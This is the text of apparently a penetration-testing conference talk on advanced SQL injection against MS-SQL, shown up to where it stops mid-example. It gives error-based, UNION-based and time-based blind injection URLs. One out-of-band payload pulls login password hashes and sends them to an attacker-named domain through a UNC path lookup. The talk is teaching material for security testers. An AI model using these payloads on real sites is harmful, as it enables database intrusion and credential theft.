Advanced SQL Injection
Presented By: 
Joe McCray
PI:EMAIL
http://twitter.com/j0emccray
http://www.linkedin.com/in/joemccray
The Last of a Dying Breed
A Network Penetration Tester
You know – the nmap, exploit, upload netcat type of guy.
A.K.A:
The only black guy at security conferences
Joe McCray.... Who the heck are you?
Step 1: Tell customer you are 31337 security professional
Customers only applied patches if it fixed something on the system 
It was common practice NOT to apply system updates that didn't fix a problem you were 
experiencing on a system (WTF ARE YOU DOING - YOU MIGHT BREAK SOMETHING!!!!!)
Step 2: Scan customer network with ISS or Nessus if you were a renegade 
Customers didn't apply patches, and rarely even had firewalls and IDSs back then
You know you only ran ISS because it had nice reports...
Step 3: Break out your uber 31337 warez and 0wn it all!!!!!
You only kept an exploit archive to save time (Hack.co.za was all you needed back then)
If you could read the screen you could 0wn the network!!!!!!!
Penetration Testing Was Easy....
If you were Ub3r 31337 you did it like this....
Port Scan & Banner Grab The Target
Get your exploit code...
Own the boxes and take screen-shots
Write The Report...               
Get Paid....                     
More Security Measures are being implemented on company networks today
Firewalls are common place (perimeter and host-based)
Anti-Virus is smarter (removes popular hacker tools, and in some cases stops buffer overflows
Intrusion Detection/Prevention Systems are hard to detect let alone bypass
NAC Solutions are making their way into networks
Network/System Administrators are much more security conscious
IT Hardware/Software vendors are integrating security into their SDLC
Geez...That's A Lot To Bypass
...I used to think Web App Security was stupid sh*t
“…This stuff isn't hacking"
…but then I saw demo of a tool called sqlninja upload nc.exe to a host vulnerable to 
sql injection
I was hooked!!!!!!!!!!!!!!!!!!!!
What Did It For Me
Getting started
Background
Basic Attack Methods
SQL Injection In The Real World
Ugh...WTF????
Filter & IDS Evasion
Javascript Validation
Serverside Filters
IDS Signatures 
WAF Evasion
Agenda
I submitted a talk entitled “SQL Injection for Mere Mortals” and it didn't get 
accepted. Sorry – I am not covering the basics....
I am NOT going to teach you the basics of SQL
I am NOT going to teach you the basics of SQL Injection
Buy me rum and coke tonight, and I'll teach you anything I know about it later
Assumptions...
SQL Injection can be broken up into 3 classes
Inband - data is extracted using the same channel that is used to inject the SQL code. 
This is the most straightforward kind of attack, in which the retrieved data is presented 
directly in the application web page
Out-of-Band - data is retrieved using a different channel (e.g.: an email with the results of 
the query is generated and sent to the tester) 
Inferential - there is no actual transfer of data, but the tester is able to reconstruct the 
information by sending particular requests and observing the resulting behaviour of the 
website/DB Server.
3 Classes of SQLI
Data is extracted using the same channel that is used to inject the SQL 
code.
This is the most straightforward kind of attack, in which the retrieved data is 
presented directly in the application web page
So this is our Error-Based, and Union-Based SQL Injections
http://[site]/page.asp?id=1 or 1=convert(int,(USER))--
Syntax error converting the nvarchar value '[j0e]' to a column of data type int.
Inband:
Data is retrieved using a different channel (e.g.: an email with the results of 
the query is generated and sent to the tester).
This is another way of getting the data out of the server (such as http, or dns).
http://[site]/page.asp?id=1;declare @host varchar(800); select @host = name + '-' + 
master.sys.fn_varbintohexstr(password_hash) + '.2.pwn3dbyj0e.com' from 
sys.sql_logins; exec('xp_fileexist ''\\' + @host + '\c$\boot.ini''');--
Out-of-band:
If the application returns an error message generated by an incorrect query, 
then it is easy to  reconstruct the logic of the original query and therefore 
understand how to perform the injection correctly. 
However, if the application hides the error details, then the tester must be 
able to reverse engineer the logic of the original query. 
The latter case is known as "Blind SQL Injection".
http://[site]/page.asp?id=1;if+not(select+system_user)+<>+'sa'+waitfor+delay+'0:0:10'--
Ask it if it's running as 'sa'
Inferential:
Automated tools are a great way to identify SQLI......
Yeah they are……just be conscious of the different SQL Injection Types....
What About Tools????
So let's start with some tools you can use to identify SQLI as well as
the type they generally identify.
mieliekoek.pl   
(error based) 
wpoison         
(error based) 
sqlmap          
(blind by default, and union if you specify) 
wapiti          
(error based) 
w3af            
(error, blind) 
paros           
(error, blind) 
sqid            
(error) 
Joe, I am sick of this sh*t what the heck to you mean by error based, blind and union?
SQL Vuln Scanners
SQL Injection Types
Error-Based SQL Injection
Union-Based SQL Injection
Blind SQL Injection
Error:
Asking the DB a question that will cause an error, and gleening information from the 
error.
Union:
The SQL UNION is used to combine the results of two or more SELECT SQL
statements into a single result. Really useful for SQL Injection :) 
Blind:
Asking the DB a true/false question and using whether valid page returned or not, or by using
the time it took for your valid page to return as the answer to the question.
My Methodology
How I test for SQL Injection
Identify
* Identify The Injection
(Tool or Manual) 
* Determine Injection Type
(Integer or String) 
Attack
* Error-Based SQL Injection 
(Easiest) 
* Union-Based SQL Injection 
(Great for data extraction) 
* Blind SQL Injection       
(Worst case....last resort) 
Now that you understand that there are 3 primary types of SQL Injection....
- Can you understand why being able to test for SQLI manually is important?
- SQL Injection Scanners will generally look for 1 type of injection.....
- The scanner may tell you the site isn't vulnerable when it really is.
Why Focus On Manual Testing
Is it integer or string based?
Integer Injection:
http://[site]/page.asp?id=1 having 1=1--
Column '[COLUMN NAME]' is invalid in the select list because it is not
contained in an aggregate function and there is no GROUP BY clause.
String Injection:
http://[site]/page.asp?id=x' having 1=1--
Column '[COLUMN NAME]' is invalid in the select list because it is not
contained in an aggregate function and there is no GROUP BY clause.
Determining this is what determines if you need a ' or not.
Determine the Injection Type
I would say that MS-SQL Injection is probably the most fun ;) 
There is always the possibility of getting access to a stored procedure
like xp_cmdshell
.......muahahahahahahahahahaha
We'll spend a little bit of time on MySQL, and not too much time on Oracle as 
its injection syntax is fairly similar to MS-SQL. But primarily for the sake of time 
we'll focus on MS-SQL.
Let’s start with MS-SQL syntax
http://[site]/page.asp?id=1 or 1=convert(int,(USER))--
Syntax error converting the nvarchar value '[DB USER]' to a column of
data type int.
Grab the database user with USER
Grab the database name with DB_NAME
Grab the servername with @@servername
Grab the Windows/OS version with @@version
Error-Based SQL Injection Syntax for 
extracting the USER
http://[site]/page.asp?id=1 UNION SELECT ALL 1--
All queries in an SQL statement containing a UNION operator must have an equal number of 
expressions in their target lists.
http://[site]/page.asp?id=1 UNION SELECT ALL 1,2--
All queries in an SQL statement containing a UNION operator must have an equal number of 
expressions in their target lists.
http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3--
All queries in an SQL statement containing a UNION operator must have an equal number of 
expressions in their target lists.
http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3,4--
NO ERROR
http://[site]/page.asp?id=null UNION SELECT ALL 1,USER,3,4--
Union-Based SQL Injection Syntax for extracting the USER
3 - Total Characters
http://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
Valid page returns immediately
http://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
Valid page returns immediately
http://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--  